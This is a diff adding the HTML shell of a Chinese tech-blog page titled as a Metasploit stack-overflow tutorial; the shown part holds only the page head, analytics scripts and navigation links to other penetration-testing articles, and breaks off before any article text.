@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>使用Metasploit实现对缓冲区栈的溢出攻击 | 冰河技术</title>
+    <meta name="generator" content="VuePress 1.9.7">
+    <link rel="icon" href="/favicon.ico">
+    <script charset="utf-8" async="async" src="/js/jquery.min.js"></script>
+    <script charset="utf-8" async="async" src="/js/global.js"></script>
+    <script charset="utf-8" async="async" src="/js/fingerprint2.min.js"></script>
+    <script charset="utf-8" async="async" src="https://v1.cnzz.com/z_stat.php?id=1281063564&amp;web_id=1281063564"></script>
+    <script charset="utf-8" async="async" src="https://s9.cnzz.com/z_stat.php?id=1281064551&amp;web_id=1281064551"></script>
+    <script>
+            var _hmt = _hmt || [];
+            (function() {
+              var hm = document.createElement("script");
+              hm.src = "https://hm.baidu.com/hm.js?d091d2fd0231588b1d0f9231e24e3f5e";
+              var s = document.getElementsByTagName("script")[0];
+              s.parentNode.insertBefore(hm, s);
+            })();
+            </script>
+    <meta name="description" content="包含：编程语言，开发技术，分布式，微服务，高并发，高可用，高可扩展，高可维护，JVM技术，MySQL，分布式数据库，分布式事务，云原生，大数据，云计算，渗透技术，各种面试题，面试技巧...">
+    <meta property="article:modified_time" content="2022-05-02T02:33:39.000Z">
+    <meta property="og:title" content="使用Metasploit实现对缓冲区栈的溢出攻击">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="/md/hack/tools/2022-05-02-013-%E4%BD%BF%E7%94%A8Metasploit%E5%AE%9E%E7%8E%B0%E5%AF%B9%E7%BC%93%E5%86%B2%E5%8C%BA%E6%A0%88%E7%9A%84%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB.html">
+    <meta name="twitter:title" content="使用Metasploit实现对缓冲区栈的溢出攻击">
+    <meta name="twitter:url" content="/md/hack/tools/2022-05-02-013-%E4%BD%BF%E7%94%A8Metasploit%E5%AE%9E%E7%8E%B0%E5%AF%B9%E7%BC%93%E5%86%B2%E5%8C%BA%E6%A0%88%E7%9A%84%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB.html">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="robots" content="all">
+    <meta name="author" content="冰河">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <meta name="keywords" content="冰河，冰河技术, 编程语言，开发技术，分布式，微服务，高并发，高可用，高可扩展，高可维护，JVM技术，MySQL，分布式数据库，分布式事务，云原生，大数据，云计算，渗透技术，各种面试题，面试技巧">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    
+    <link rel="preload" href="/assets/css/0.styles.ab888ebb.css" as="style"><link rel="preload" href="/assets/css/styles.css?v=1651458923155" as="style"><link rel="preload" href="/assets/js/cg-styles.js?v=1651458923155" as="script"><link rel="preload" href="/assets/js/cg-app.js?v=1651458923155" as="script"><link rel="preload" href="/assets/js/cg-4.js?v=1651458923155" as="script"><link rel="preload" href="/assets/js/cg-3.js?v=1651458923155" as="script"><link rel="preload" href="/assets/js/cg-205.js?v=1651458923155" as="script"><link rel="preload" href="/assets/js/cg-5.js?v=1651458923155" as="script"><link rel="preload" href="/assets/js/cg-6.js?v=1651458923155" as="script">
+    <link rel="stylesheet" href="/assets/css/0.styles.ab888ebb.css"><link rel="stylesheet" href="/assets/css/styles.css?v=1651458923155">
+  </head>
+  <body>
+    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">冰河技术</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/md/other/guide-to-reading.html" class="nav-link">
+  导读
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="核心技术" class="dropdown-title"><span class="title">核心技术</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          Java核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/java/basics/2022-04-28-全网最全正则表达式总结.html" class="nav-link">
+  Java基础
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/advanced/default.html" class="nav-link">
+  Java进阶
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/senior/default.html" class="nav-link">
+  Java高级
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/java8/2022-03-31-001-Java8有哪些新特性呢？.html" class="nav-link">
+  Java8新特性
+</a></li></ul></li><li class="dropdown-item"><h4>
+          Spring核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/spring/ioc/2022-04-04-001-聊聊Spring注解驱动开发那些事儿.html" class="nav-link">
+  IOC核心技术
+</a></li><li class="dropdown-subitem"><a href="/md/core/spring/aop/default.html" class="nav-link">
+  AOP核心技术
+</a></li></ul></li><li class="dropdown-item"><h4>
+          JVM核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/jvm/2022-04-18-001-JVM调优的几种场景.html" class="nav-link">
+  JVM调优技术
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="性能调优" class="dropdown-title"><span class="title">性能调优</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/performance/jvm/default.html" class="nav-link">
+  JVM性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/tomcat/default.html" class="nav-link">
+  Tomcat性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/mysql/default.html" class="nav-link">
+  MySQL性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/system/default.html" class="nav-link">
+  操作系统性能调优
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="并发编程" class="dropdown-title"><span class="title">并发编程</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/concurrent/bottom/default.html" class="nav-link">
+  底层技术
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/source/2020-03-30-001-一文搞懂线程与多线程.html" class="nav-link">
+  源码分析
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/basics/2020-03-30-001-明明中断了线程，却为何不起作用呢？.html" class="nav-link">
+  基础案例
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/ActualCombat/default.html" class="nav-link">
+  实战案例
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/interview/default.html" class="nav-link">
+  面试
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/framework/default.html" class="nav-link">
+  系统架构
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="框架源码" class="dropdown-title"><span class="title">框架源码</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/frame/spring/default.html" class="nav-link">
+  Spring源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/springmvc/default.html" class="nav-link">
+  SpringMVC源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/mybatis/default.html" class="nav-link">
+  MyBatis源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/dubbo/default.html" class="nav-link">
+  Dubbo源码
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="分布式" class="dropdown-title"><span class="title">分布式</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          缓存技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/cache/default.html" class="nav-link">
+  Redis
+</a></li></ul></li><li class="dropdown-item"><h4>
+          服务注册发现
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/zookeeper/default.html" class="nav-link">
+  Zookeeper
+</a></li></ul></li><li class="dropdown-item"><h4>
+          消息中间件
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/mq/rabbitmq/default.html" class="nav-link">
+  RabbitMQ
+</a></li><li class="dropdown-subitem"><a href="/md/distributed/mq/rocketmq/default.html" class="nav-link">
+  RocketMQ
+</a></li><li class="dropdown-subitem"><a href="/md/distributed/mq/kafka/default.html" class="nav-link">
+  Kafka
+</a></li></ul></li><li class="dropdown-item"><h4>
+          网络通信
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/netty/default.html" class="nav-link">
+  Netty
+</a></li></ul></li><li class="dropdown-item"><h4>
+          远程调用
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/dubbo/default.html" class="nav-link">
+  Dubbo
+</a></li></ul></li><li class="dropdown-item"><h4>
+          数据库
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/mongodb/default.html" class="nav-link">
+  MongoDB
+</a></li></ul></li><li class="dropdown-item"><h4>
+          搜索引擎
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/es/default.html" class="nav-link">
+  ElasticSearch
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="微服务" class="dropdown-title"><span class="title">微服务</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/microservices/springboot/default.html" class="nav-link">
+  SpringBoot
+</a></li><li class="dropdown-item"><!----> <a href="/md/microservices/springcloudalibaba/2022-04-02-SpringCloudAlibaba专栏开篇.html" class="nav-link">
+  SpringCloudAlibaba
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="中间件" class="dropdown-title"><span class="title">中间件</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/middleware/bytecode/2022-04-11-001-工作多年的你依然重复做着CRUD-是否接触过这种技术.html" class="nav-link">
+  字节码编程
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/threadpool/default.html" class="nav-link">
+  手写线程池
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/limiter/default.html" class="nav-link">
+  分布式限流
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/independent/default.html" class="nav-link">
+  开源项目
+</a></li></ul></div></div><div class="nav-item"><a href="/md/project/default.html" class="nav-link">
+  项目实战
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="渗透技术" class="dropdown-title"><span class="title">渗透技术</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/hack/environment/2022-04-17-001-安装Kali系统.html" class="nav-link">
+  基础环境篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/tools/2022-04-17-001-使用Easy-Creds工具攻击无线网络.html" class="nav-link">
+  渗透工具篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/shell/default.html" class="nav-link">
+  漏洞拿Shell篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/crack/default.html" class="nav-link">
+  暴力破解篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/bash/default.html" class="nav-link">
+  渗透脚本篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/raising/default.html" class="nav-link">
+  数据与系统提权篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/client/default.html" class="nav-link">
+  客户端渗透篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/sociology/default.html" class="nav-link">
+  社会工程学
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/question/default.html" class="nav-link">
+  问题记录篇
+</a></li></ul></div></div><div class="nav-item"><a href="/md/interview/2022-04-18-001-面试必问-聊聊JVM性能调优.html" class="nav-link">
+  面试必问系列
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="📚PDF" class="dropdown-title"><span class="title">📚PDF</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          出版图书
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-深入理解分布式事务.html" class="nav-link">
+  《深入理解分布式事务：原理与实战》
+</a></li><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-MySQL技术大全.html" class="nav-link">
+  《MySQL技术大全：开发、优化与运维实战》
+</a></li><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-海量数据处理与大数据技术实战.html" class="nav-link">
+  《海量数据处理与大数据技术实战》
+</a></li></ul></li><li class="dropdown-item"><h4>
+          电子书籍
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/knowledge/pdf/2022-03-30-《冰河的渗透实战笔记》电子书，442页，37万字，正式发布.html" class="nav-link">
+  冰河的渗透实战笔记
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="关于" class="dropdown-title"><span class="title">关于</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/about/me/about-me.html" class="nav-link">
+  关于自己
+</a></li><li class="dropdown-item"><!----> <a href="/md/about/study/default.html" class="nav-link">
+  关于学习
+</a></li><li class="dropdown-item"><!----> <a href="/md/about/job/default.html" class="nav-link">
+  关于职场
+</a></li></ul></div></div><div class="nav-item"><a href="https://space.bilibili.com/517638832" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  B站
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div><div class="nav-item"><a href="https://github.com/binghe001/BingheGuide" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Github
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/md/other/guide-to-reading.html" class="nav-link">
+  导读
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="核心技术" class="dropdown-title"><span class="title">核心技术</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          Java核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/java/basics/2022-04-28-全网最全正则表达式总结.html" class="nav-link">
+  Java基础
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/advanced/default.html" class="nav-link">
+  Java进阶
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/senior/default.html" class="nav-link">
+  Java高级
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/java8/2022-03-31-001-Java8有哪些新特性呢？.html" class="nav-link">
+  Java8新特性
+</a></li></ul></li><li class="dropdown-item"><h4>
+          Spring核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/spring/ioc/2022-04-04-001-聊聊Spring注解驱动开发那些事儿.html" class="nav-link">
+  IOC核心技术
+</a></li><li class="dropdown-subitem"><a href="/md/core/spring/aop/default.html" class="nav-link">
+  AOP核心技术
+</a></li></ul></li><li class="dropdown-item"><h4>
+          JVM核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/jvm/2022-04-18-001-JVM调优的几种场景.html" class="nav-link">
+  JVM调优技术
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="性能调优" class="dropdown-title"><span class="title">性能调优</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/performance/jvm/default.html" class="nav-link">
+  JVM性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/tomcat/default.html" class="nav-link">
+  Tomcat性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/mysql/default.html" class="nav-link">
+  MySQL性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/system/default.html" class="nav-link">
+  操作系统性能调优
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="并发编程" class="dropdown-title"><span class="title">并发编程</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/concurrent/bottom/default.html" class="nav-link">
+  底层技术
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/source/2020-03-30-001-一文搞懂线程与多线程.html" class="nav-link">
+  源码分析
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/basics/2020-03-30-001-明明中断了线程，却为何不起作用呢？.html" class="nav-link">
+  基础案例
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/ActualCombat/default.html" class="nav-link">
+  实战案例
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/interview/default.html" class="nav-link">
+  面试
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/framework/default.html" class="nav-link">
+  系统架构
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="框架源码" class="dropdown-title"><span class="title">框架源码</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/frame/spring/default.html" class="nav-link">
+  Spring源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/springmvc/default.html" class="nav-link">
+  SpringMVC源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/mybatis/default.html" class="nav-link">
+  MyBatis源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/dubbo/default.html" class="nav-link">
+  Dubbo源码
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="分布式" class="dropdown-title"><span class="title">分布式</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          缓存技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/cache/default.html" class="nav-link">
+  Redis
+</a></li></ul></li><li class="dropdown-item"><h4>
+          服务注册发现
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/zookeeper/default.html" class="nav-link">
+  Zookeeper
+</a></li></ul></li><li class="dropdown-item"><h4>
+          消息中间件
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/mq/rabbitmq/default.html" class="nav-link">
+  RabbitMQ
+</a></li><li class="dropdown-subitem"><a href="/md/distributed/mq/rocketmq/default.html" class="nav-link">
+  RocketMQ
+</a></li><li class="dropdown-subitem"><a href="/md/distributed/mq/kafka/default.html" class="nav-link">
+  Kafka
+</a></li></ul></li><li class="dropdown-item"><h4>
+          网络通信
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/netty/default.html" class="nav-link">
+  Netty
+</a></li></ul></li><li class="dropdown-item"><h4>
+          远程调用
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/dubbo/default.html" class="nav-link">
+  Dubbo
+</a></li></ul></li><li class="dropdown-item"><h4>
+          数据库
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/mongodb/default.html" class="nav-link">
+  MongoDB
+</a></li></ul></li><li class="dropdown-item"><h4>
+          搜索引擎
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/es/default.html" class="nav-link">
+  ElasticSearch
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="微服务" class="dropdown-title"><span class="title">微服务</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/microservices/springboot/default.html" class="nav-link">
+  SpringBoot
+</a></li><li class="dropdown-item"><!----> <a href="/md/microservices/springcloudalibaba/2022-04-02-SpringCloudAlibaba专栏开篇.html" class="nav-link">
+  SpringCloudAlibaba
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="中间件" class="dropdown-title"><span class="title">中间件</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/middleware/bytecode/2022-04-11-001-工作多年的你依然重复做着CRUD-是否接触过这种技术.html" class="nav-link">
+  字节码编程
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/threadpool/default.html" class="nav-link">
+  手写线程池
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/limiter/default.html" class="nav-link">
+  分布式限流
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/independent/default.html" class="nav-link">
+  开源项目
+</a></li></ul></div></div><div class="nav-item"><a href="/md/project/default.html" class="nav-link">
+  项目实战
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="渗透技术" class="dropdown-title"><span class="title">渗透技术</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/hack/environment/2022-04-17-001-安装Kali系统.html" class="nav-link">
+  基础环境篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/tools/2022-04-17-001-使用Easy-Creds工具攻击无线网络.html" class="nav-link">
+  渗透工具篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/shell/default.html" class="nav-link">
+  漏洞拿Shell篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/crack/default.html" class="nav-link">
+  暴力破解篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/bash/default.html" class="nav-link">
+  渗透脚本篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/raising/default.html" class="nav-link">
+  数据与系统提权篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/client/default.html" class="nav-link">
+  客户端渗透篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/sociology/default.html" class="nav-link">
+  社会工程学
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/question/default.html" class="nav-link">
+  问题记录篇
+</a></li></ul></div></div><div class="nav-item"><a href="/md/interview/2022-04-18-001-面试必问-聊聊JVM性能调优.html" class="nav-link">
+  面试必问系列
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="📚PDF" class="dropdown-title"><span class="title">📚PDF</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          出版图书
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-深入理解分布式事务.html" class="nav-link">
+  《深入理解分布式事务：原理与实战》
+</a></li><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-MySQL技术大全.html" class="nav-link">
+  《MySQL技术大全：开发、优化与运维实战》
+</a></li><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-海量数据处理与大数据技术实战.html" class="nav-link">
+  《海量数据处理与大数据技术实战》
+</a></li></ul></li><li class="dropdown-item"><h4>
+          电子书籍
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/knowledge/pdf/2022-03-30-《冰河的渗透实战笔记》电子书，442页，37万字，正式发布.html" class="nav-link">
+  冰河的渗透实战笔记
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="关于" class="dropdown-title"><span class="title">关于</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/about/me/about-me.html" class="nav-link">
+  关于自己
+</a></li><li class="dropdown-item"><!----> <a href="/md/about/study/default.html" class="nav-link">
+  关于学习
+</a></li><li class="dropdown-item"><!----> <a href="/md/about/job/default.html" class="nav-link">
+  关于职场
+</a></li></ul></div></div><div class="nav-item"><a href="https://space.bilibili.com/517638832" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  B站
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div><div class="nav-item"><a href="https://github.com/binghe001/BingheGuide" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Github
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>渗透工具篇</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/md/hack/tools/2022-04-17-001-使用Easy-Creds工具攻击无线网络.html" class="sidebar-link">使用Easy-Creds工具攻击无线网络</a></li><li><a href="/md/hack/tools/2022-04-17-002-Nmap+Zenmap+Amap+Zmap.html" class="sidebar-link">Nmap+Zenmap+Amap+Zmap</a></li><li><a href="/md/hack/tools/2022-04-17-003-Zenmap.html" class="sidebar-link">Zenmap</a></li><li><a href="/md/hack/tools/2022-04-17-004-Amap.html" class="sidebar-link">Amap</a></li><li><a href="/md/hack/tools/2022-04-17-005-Zmap.html" class="sidebar-link">Zmap</a></li><li><a href="/md/hack/tools/2022-04-17-006-Nessus的整理.html" class="sidebar-link">Nessus的整理</a></li><li><a href="/md/hack/tools/2022-04-17-007-Burpsuite上传截断及截断原理介绍.html" class="sidebar-link">Burpsuite上传截断及截断原理介绍</a></li><li><a href="/md/hack/tools/2022-04-17-008-Kali2.0Meterpreter运用.html" class="sidebar-link">Kali2.0 Meterpreter 运用</a></li><li><a href="/md/hack/tools/2022-04-17-009-lcx.exe内网转发命令教程-LCX免杀下载.html" class="sidebar-link">lcx.exe内网转发命令教程-LCX免杀下载</a></li><li><a href="/md/hack/tools/2022-04-17-010-字典生成工具Crunch的使用案例.html" class="sidebar-link">字典生成工具Crunch的使用案例</a></li><li><a href="/md/hack/tools/2022-04-17-011-WinlogonHack获取系统密码.html" class="sidebar-link">WinlogonHack获取系统密码</a></li><li><a href="/md/hack/tools/2022-04-17-012-Msfvenom生成各类Payload命令.html" class="sidebar-link">Msfvenom生成各类Payload命令</a></li><li><a href="/md/hack/tools/2022-04-17-013-PsExec下载地址及其用法.html" class="sidebar-link">PsExec下载地址及其用法</a></li><li><a href="/md/hack/tools/2022-04-17-014-Hydra安装Libssh模块.html" class="sidebar-link">Hydra安装Libssh模块</a></li><li><a href="/md/hack/tools/2022-04-17-015-利用procdump+Mimikatz绕过杀软获取Windows明文密码.html" class="sidebar-link">利用procdump+Mimikatz 绕过杀软获取Windows明文密码</a></li><li><a href="/md/hack/tools/2022-04-17-016-SQLMap的用法+谷歌黑客语法.html" 